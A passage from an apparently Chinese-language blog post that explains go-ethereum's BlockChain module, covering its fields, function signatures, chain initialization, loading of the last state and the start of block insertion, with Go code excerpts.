级别的数据量了。 在这个数量级别下还有着非常高的性能，主要归功于它的良好的设计。,特别是 LSM 算法。 [1] LevelDB 是单进程的服务，性能非常之高，在一台 4 核 Q6600 的 CPU 机器上，每秒钟写数据超过 40w，而随机读的性能每秒钟超过 10w。)</li><li>genesisBlock：创始区块</li><li>currentBlock：当前区块，blockchain 中并不是储存链所有的 block，而是通过 currentBlock 向前回溯直到 genesisBlock，这样就构成了区块链</li><li>bodyCache、bodyRLPCache、blockCache、futureBlocks：区块链中的缓存结构，用于加快区块链的读取和构建；</li><li>hc：headerchain 区块头链，由 blockchain 额外维护的另一条链，由于 Header 和 Block 的储存空间是有很大差别的，但同时 Block 的 Hash 值就是 Header（RLP）的 Hash 值，所以维护一个 headerchain 可以用于快速延长链，验证通过后再下载 blockchain，或者可以与 blockchain 进行相互验证；</li><li>processor：执行区块链交易的接口，收到一个新的区块时，要对区块中的所有交易执行一遍，一方面是验证，一方面是更新世界状态；</li><li>validator：验证数据有效性的接口</li><li>futureBlocks：收到的区块时间大于当前头区块时间 15s 而小于 30s 的区块，可作为当前节点待处理的区块。</li></ul><hr><h2 id="函数介绍">函数介绍</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadBlocks 处理客户端从网络上获取的最近的bad block列表</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> BadBlocks() []*types.Block &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// addBadBlock 把bad block放入缓存</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> addBadBlock(block *types.Block) &#123;&#125;</span><br><span class="line"><span class="comment">// CurrentBlock取回主链的当前头区块，这个区块是从blockchian的内部缓存中取得</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> CurrentBlock() *types.Block &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CurrentHeader检索规范链的当前头区块header。从HeaderChain的内部缓存中检索标头。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> CurrentHeader() *types.Header&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CurrentFastBlock取回主链的当前fast-sync头区块，这个区块是从blockchian的内部缓存中取得</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> CurrentFastBlock() *types.Block &#123;&#125;</span><br><span class="line"><span class="comment">// 将活动链或其子集写入给定的编写器.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Export(w io.Writer) <span class="type">error</span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> ExportN(w io.Writer, first <span class="type">uint64</span>, last <span class="type">uint64</span>) <span class="type">error</span> &#123;&#125;</span><br><span class="line"><span class="comment">// FastSyncCommitHead快速同步，将当前头块设置为特定hash的区块。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> FastSyncCommitHead(hash common.Hash) <span class="type">error</span> &#123;&#125;</span><br><span class="line"><span class="comment">// GasLimit返回当前头区块的gas limit</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GasLimit() <span class="type">uint64</span> &#123;&#125;</span><br><span class="line"><span class="comment">// Genesis 取回genesis区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Genesis() *types.Block &#123;&#125;</span><br><span class="line"><span class="comment">// 通过hash从数据库或缓存中取到一个区块体(transactions and uncles)或RLP数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBody(hash common.Hash) *types.Body &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBodyRLP(hash common.Hash) rlp.RawValue &#123;&#125;</span><br><span class="line"><span class="comment">// GetBlock 通过hash和number取到区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlock(hash common.Hash, number <span class="type">uint64</span>) *types.Block &#123;&#125;</span><br><span class="line"><span class="comment">// GetBlockByHash 通过hash取到区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlockByHash(hash common.Hash) *types.Block &#123;&#125;</span><br><span class="line"><span class="comment">// GetBlockByNumber 通过number取到区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlockByNumber(number <span class="type">uint64</span>) *types.Block &#123;&#125;</span><br><span class="line"><span class="comment">// 获取给定hash和number区块的header</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetHeader(hash common.Hash, number <span class="type">uint64</span>) *types.Header&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取给定hash的区块header</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetHeaderByHash(hash common.Hash) *types.Header&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取给定number的区块header</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetHeaderByNumber(number <span class="type">uint64</span>) *types.Header&#123;&#125;</span><br><span class="line"><span class="comment">// HasBlock检验hash对应的区块是否完全存在数据库中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> HasBlock(hash common.Hash, number <span class="type">uint64</span>) <span class="type">bool</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查给定hash和number的区块的区块头是否存在数据库</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> HasHeader(hash common.Hash, number <span class="type">uint64</span>) <span class="type">bool</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HasState检验state trie是否完全存在数据库中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> HasState(hash common.Hash) <span class="type">bool</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HasBlockAndState检验hash对应的block和state trie是否完全存在数据库中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> HasBlockAndState(hash common.Hash, number <span class="type">uint64</span>) <span class="type">bool</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 获取给定hash的区块的总难度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetTd(hash common.Hash, number <span class="type">uint64</span>) *big.Int&#123;&#125;</span><br><span class="line"><span class="comment">// 获取从给定hash的区块到genesis区块的所有hash</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlockHashesFromHash(hash common.Hash, max <span class="type">uint64</span>) []common.Hash&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetReceiptsByHash 在特定的区块中取到所有交易的收据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetReceiptsByHash(hash common.Hash) types.Receipts &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetBlocksFromHash 取到特定hash的区块及其n-1个父区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlocksFromHash(hash common.Hash, n <span class="type">int</span>) (blocks []*types.Block) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetUnclesInChain 取回从给定区块到向前回溯特定距离到区块上的所有叔区块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetUnclesInChain(block *types.Block, length <span class="type">int</span>) []*types.Header &#123;&#125;</span><br><span class="line"><span class="comment">// insert 将新的头块注入当前块链。 该方法假设该块确实是真正的头。</span></span><br><span class="line"><span class="comment">// 如果它们较旧或者它们位于不同的侧链上，它还会将头部标题和头部快速同步块重置为同一个块。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> insert(block *types.Block) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// InsertChain尝试将给定批量的block插入到规范链中，否则，创建一个分叉。 如果返回错误，它将返回失败块的索引号以及描述错误的错误。</span></span><br><span class="line"><span class="comment">//插入完成后，将触发所有累积的事件。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> InsertChain(chain types.Blocks) (<span class="type">int</span>, <span class="type">error</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insertChain将执行实际的链插入和事件聚合。</span></span><br><span class="line"><span class="comment">// 此方法作为单独方法存在的唯一原因是使用延迟语句使锁定更清晰。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> insertChain(chain types.Blocks) (<span class="type">int</span>, []<span class="keyword">interface</span>&#123;&#125;, []*types.Log, <span class="type">error</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// InsertHeaderChain尝试将给定的headerchain插入到本地链中，可能会创建一个重组</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> InsertHeaderChain(chain []*types.Header, checkFreq <span class="type">int</span>) (<span class="type">int</span>, <span class="type">error</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// InsertReceiptChain 使用交易和收据数据来完成已经存在的headerchain</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> InsertReceiptChain(blockChain types.Blocks, receiptChain []types.Receipts) (<span class="type">int</span>, <span class="type">error</span>) &#123;&#125;</span><br><span class="line"><span class="comment">//loadLastState从数据库加载最后一个已知的链状态。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> loadLastState() <span class="type">error</span> &#123;&#125;</span><br><span class="line"><span class="comment">// Processor 返回当前current processor.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Processor() Processor &#123;&#125;</span><br><span class="line"><span class="comment">// Reset重置清除整个区块链，将其恢复到genesis state.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Reset() <span class="type">error</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ResetWithGenesisBlock 清除整个区块链, 用特定的genesis state重塑，被Reset所引用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> ResetWithGenesisBlock(genesis *types.Block) <span class="type">error</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// repair尝试通过回滚当前块来修复当前的区块链，直到找到具有关联状态的块。</span></span><br><span class="line"><span class="comment">// 用于修复由崩溃/断电或简单的非提交尝试导致的不完整的数据库写入。</span></span><br><span class="line"><span class="comment">//此方法仅回滚当前块。 当前标头和当前快速块保持不变。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> repair(head **types.Block) <span class="type">error</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// reorgs需要两个块、一个旧链以及一个新链，并将重新构建块并将它们插入到新的规范链中，并累积潜在的缺失事务并发布有关它们的事件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> reorg(oldBlock, newBlock *types.Block) <span class="type">error</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rollback 旨在从数据库中删除不确定有效的链片段</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Rollback(chain []common.Hash) &#123;&#125;</span><br><span class="line"><span class="comment">// SetReceiptsData 计算收据的所有非共识字段</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetReceiptsData</span><span class="params">(config *params.ChainConfig, block *types.Block, receipts types.Receipts)</span></span> <span class="type">error</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetHead将本地链回滚到指定的头部。</span></span><br><span class="line"><span class="comment">// 通常可用于处理分叉时重选主链。对于Header，新Header上方的所有内容都将被删除，新的头部将被设置。</span></span><br><span class="line"><span class="comment">// 但如果块体丢失，则会进一步回退（快速同步后的非归档节点）。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> SetHead(head <span class="type">uint64</span>) <span class="type">error</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetProcessor设置状态修改所需要的processor</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> SetProcessor(processor Processor) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetValidator 设置用于验证未来区块的validator</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> SetValidator(validator Validator) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// State 根据当前头区块返回一个可修改的状态</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> State() (*state.StateDB, <span class="type">error</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// StateAt 根据特定时间点返回新的可变状态</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> StateAt(root common.Hash) (*state.StateDB, <span class="type">error</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stop 停止区块链服务，如果有正在import的进程，它会使用procInterrupt来取消。</span></span><br><span class="line"><span class="comment">// it will abort them using the procInterrupt.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Stop() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TrieNode从memory缓存或storage中检索与trie节点hash相关联的数据。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> TrieNode(hash common.Hash) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Validator返回当前validator.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> Validator() Validator &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// WriteBlockWithoutState仅将块及其元数据写入数据库，但不写入任何状态。 这用于构建竞争方叉，直到超过规范总难度。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> WriteBlockWithoutState(block *types.Block, td *big.Int) (err <span class="type">error</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// WriteBlockWithState将块和所有关联状态写入数据库。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> WriteBlockWithState(block *types.Block, receipts []*types.Receipt, state *state.StateDB) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// writeHeader将标头写入本地链，因为它的父节点已知。 如果新插入的报头的总难度变得大于当前已知的TD，则重新路由规范链</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> writeHeader(header *types.Header) <span class="type">error</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理未来区块链</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> update() &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="blockchain-初始化-NewBlockChain">blockchain 初始化(NewBlockChain)</h2><p>主要步骤：</p><p>①：创建一个新的 headerChain 结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.hc, err = NewHeaderChain(db, chainConfig, engine, bc.getProcInterrupt)</span><br></pre></td></tr></table></figure><ol><li>根据<strong>number（0）<strong>获取</strong>genesisHeader</strong></li><li>从<strong>rawdb 中读取 HeadBlock 并存储在 currentHeade</strong>r 中</li></ol><p>②：获取 genesisBlock</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bc.genesisBlock = bc.GetBlockByNumber(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>③：如果链不为空，则用老的链数据初始化链</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> bc.empty() &#123;</span><br><span class="line">rawdb.InitDatabaseFromFreezer(bc.db)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>④：加载最新的状态数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bc.loadLastState(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑤：检查区块哈希的当前状态，并确保链中没有任何坏块</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> hash := <span class="keyword">range</span> BadHashes &#123;</span><br><span class="line"><span class="keyword">if</span> header := bc.GetHeaderByHash(hash); header != <span class="literal">nil</span> &#123;</span><br><span class="line">headerByNumber := bc.GetHeaderByNumber(header.Number.Uint64())</span><br><span class="line"><span class="keyword">if</span> headerByNumber != <span class="literal">nil</span> &amp;&amp; headerByNumber.Hash() == header.Hash() &#123;</span><br><span class="line">log.Error(<span class="string">&quot;Found bad hash, rewinding chain&quot;</span>, <span class="string">&quot;number&quot;</span>, header.Number, <span class="string">&quot;hash&quot;</span>, header.ParentHash)</span><br><span class="line">bc.SetHead(header.Number.Uint64() - <span class="number">1</span>)</span><br><span class="line">log.Error(<span class="string">&quot;Chain rewind was successful, resuming normal operation&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⑥：定时处理 future block</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> bc.update()</span><br><span class="line">-&gt;procFutureBlocks</span><br><span class="line">-&gt;InsertChain</span><br></pre></td></tr></table></figure><p>总的来说做了以下几件事：</p><ol><li>配置 cacheConfig，创建各种 lru 缓存</li><li>初始化 triegc</li><li>初始化 stateDb：state.NewDatabase(db)</li><li>初始化区块和状态验证：NewBlockValidator()</li><li>初始化状态处理器：NewStateProcessor()</li><li>初始化区块头部链：NewHeaderChain()</li><li>查找创世区块：bc.genesisBlock = bc.GetBlockByNumber(0)</li><li>加载最新的状态数据：bc.loadLastState()</li><li>检查区块哈希的当前状态，并确保链中没有任何坏块</li><li>go bc.<strong>futureBlocksLoop</strong>()定时处理 future block</li></ol><h2 id="加载区块链状态-locadLastState">加载区块链状态(locadLastState)</h2><p>1：从 rawdb 数据库中恢复<strong>最新的</strong>headblock，如果 rawdb 数据库空的话也就是没有读出来头部区块的话，触发 reset chain</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取最新的头部hash</span></span><br><span class="line">head := rawdb.ReadHeadBlockHash(bc.db)</span><br><span class="line"><span class="keyword">if</span> head == (common.Hash&#123;&#125;) &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Empty database, resetting chain&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> bc.Reset()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2：通过头部 hash 获取头部区块，确保整个 head block 是可以获取的，若为空，则触发 reset chain</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过头部hash获取头部区块</span></span><br><span class="line">currentBlock := bc.GetBlockByHash(head)</span><br><span class="line"><span class="keyword">if</span> currentBlock == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Corrupt or empty database, init from scratch</span></span><br><span class="line">log.Warn(<span class="string">&quot;Head block missing, resetting chain&quot;</span>, <span class="string">&quot;hash&quot;</span>, head)</span><br><span class="line"><span class="keyword">return</span> bc.Reset()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 GetBlockByHash(head)的方法是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *BlockChain)</span></span> GetBlockByHash(hash common.Hash) *types.Block &#123;</span><br><span class="line">    <span class="comment">//通过hash获取number</span></span><br><span class="line">number := bc.hc.GetBlockNumber(hash)</span><br><span class="line"><span class="keyword">if</span> number == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过number获取区块</span></span><br><span class="line"><span class="keyword">return</span> bc.GetBlock(hash, *number)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3：存储当前的 headblock 和设置当前的 headHeader 以及头部 fast 块</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bc.currentBlock.Store(currentBlock)</span><br><span class="line">....</span><br><span class="line">bc.hc.SetCurrentHeader(currentHeader)</span><br><span class="line">...</span><br><span class="line">bc.currentFastBlock.Store(currentBlock)</span><br></pre></td></tr></table></figure><p>具体的<code>store</code>函数的使用我写了一段代码作为示例帮助理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync/atomic&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> res atomic.Value</span><br><span class="line">res.Store(<span class="string">&quot;test1&quot;</span>)</span><br><span class="line">fmt.Println(res)<span class="comment">//res=&gt;&#123;test1&#125;</span></span><br><span class="line"></span><br><span class="line">res.Store(<span class="string">&quot;test2&quot;</span>)</span><br><span class="line">fmt.Println(res)<span class="comment">//res=&gt;&#123;test2&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>证明里面存放的数据会进行覆盖，所以类似于这样的代码就好理解了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bc.currentFastBlock.Store(currentBlock)</span><br><span class="line">headFastBlockGauge.Update(<span class="type">int64</span>(currentBlock.NumberU64()))</span><br><span class="line"></span><br><span class="line"><span class="comment">//ReadHeadFastBlockHash retrieves the hash of the current fast-sync head block.</span></span><br><span class="line"><span class="keyword">if</span> head := rawdb.ReadHeadFastBlockHash(bc.db); head != (common.Hash&#123;&#125;) &#123;</span><br><span class="line"><span class="keyword">if</span> block := bc.GetBlockByHash(head); block != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//为何store完之后又进行一次store</span></span><br><span class="line">            <span class="comment">//其实是为了和链进行同步（其他地方链可能</span></span><br><span class="line">            bc.currentFastBlock.Store(block)</span><br><span class="line">headFastBlockGauge.Update(<span class="type">int64</span>(block.NumberU64()))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>获取难度值，具体难度值的计算请参考该篇文章：<a href="https://zhuanlan.zhihu.com/p/140750633">以太坊挖矿难度调整算法详解</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取总难度值</span></span><br><span class="line">headerTd := bc.GetTd(currentHeader.Hash(), currentHeader.Number.Uint64())</span><br><span class="line">blockTd := bc.GetTd(currentBlock.Hash(), currentBlock.NumberU64())</span><br><span class="line">fastTd := bc.GetTd(currentFastBlock.Hash(), currentFastBlock.NumberU64())</span><br></pre></td></tr></table></figure></li></ol><h2 id="插入数据到-blockchain-中">插入数据到 blockchain 中</h2><p>①：如果链正在中断，直接返回</p><p>②：开启并行的签名恢复</p><p>③：校验 header</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abort, results := bc.engine.VerifyHeaders(bc, headers, seals)</span><br></pre></td></tr></table></figure><p>校验<code>header</code>是共识引擎所要做的事情</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 